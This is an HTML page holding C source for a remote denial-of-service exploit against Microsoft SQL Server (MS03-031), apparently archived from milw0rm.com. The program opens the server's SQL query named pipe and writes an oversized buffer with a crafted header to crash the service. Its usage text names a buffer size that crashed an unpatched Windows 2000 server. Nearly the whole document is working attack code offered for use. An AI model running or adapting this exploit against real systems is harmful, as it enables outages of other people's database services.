<html><head><title>MS Windows SQL Server Denial of Service Remote Exploit (MS03-031)
</title></head><pre>////////////////////////////////////////////////////////////////
//      
//      Microsoft SQL Server DoS Remote Exploit (MS03-031)
//                    By refdom of xfocus
//    
////////////////////////////////////////////////////////////////

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;windows.h&gt;


void Usage()
{
	printf(&quot;******************************************\n&quot;);
	printf(&quot;exp for Microsoft SQL Server DoS(MS03-031)\n\n&quot;);
	printf(&quot;\t Written by Refdom\n&quot;);
	printf(&quot;\t Email: refdom xfocus org\n&quot;);
	printf(&quot;\t Homepage: www.xfocus.org\n\n&quot;);
	printf(&quot;Usage: DOSMSSQL.exe server buffersize\n&quot;);
	printf(&quot;eg: DOSMSSQL.exe192.168.0.1 9000\n\n&quot;);
	printf(&quot;The buffersize depends on service pack level.\n&quot;);
	printf(&quot;I test it on my server: windows 2000, mssqlserver no sp.\n&quot;);
	printf(&quot;when buffersize is 9000, the server can be crashed.\n&quot;);
	printf(&quot;\n&quot;);
	printf(&quot;*******************************************\n\n&quot;);
}


int main(int argc, char* argv[])
{
	char lpPipeName[50];
	char *lpBuffer = NULL;
	unsigned long ulSize = 0;

	BOOL bResult;
	DWORD dwWritten = 0, dwMode;
	HANDLE hPipe;

	Usage();

	printf(&quot;Starting...\n&quot;);

	if (argc != 3)
		goto Exit0;
	
	if (strlen(argv[1]) &lt; 20)
	{
		sprintf(lpPipeName, &quot;\\\\%s\\\\.\\pipe\\sql\\query&quot;, argv[1]);
	}
	else
	{
		printf(&quot;Error!server\n&quot;);
		goto Exit0;
	}

	ulSize= atol(argv[2]);

	lpBuffer = (char*)malloc(ulSize + 2);
	if (NULL == lpBuffer)
	{
		printf(&quot;malloc error!\n&quot;);
		goto Exit0;
	}

	memset(lpBuffer, 0, ulSize + 2);
	memset(lpBuffer, 'A', ulSize);
	*lpBuffer = '\x12';
	*(lpBuffer + 1) = '\x01';
	*(lpBuffer + 2) = '\x00';
	
	printf(&quot;Connecting Server...\n&quot;);

	hPipe = CreateFile(lpPipeName, 
					GENERIC_READ | GENERIC_WRITE,
					0,
					NULL,
					OPEN_EXISTING,
					0,
					NULL);
	if (INVALID_HANDLE_VALUE == hPipe)
	{
		printf(&quot;Error!Connect server!%d\n&quot;, GetLastError());
		goto Exit0;
	}

   dwMode = PIPE_READMODE_MESSAGE; 
   bResult = SetNamedPipeHandleState( 
      hPipe,    // pipe handle 
      &amp;dwMode,  // new pipe mode 
      NULL,     // don't set maximum bytes 
      NULL);    // don't set maximum time 
   if (!bResult)
   {
		printf(&quot;Error!SetNamedPipeHandleState.%d\n&quot;, GetLastError());
		goto Exit0;
   }

	bResult = WriteFile(hPipe, lpBuffer, ulSize + 1, &amp;dwWritten, NULL);

	if (!bResult)
	{
		printf(&quot;\n\tError!WriteFile.%d\n\n&quot;, GetLastError());
		printf(&quot;When see the error message, the target may be crashed!!\n\n&quot;);
		goto Exit0;
	}

Exit0:
	
	return 0;
}

// milw0rm.com [2003-07-25]</pre></html>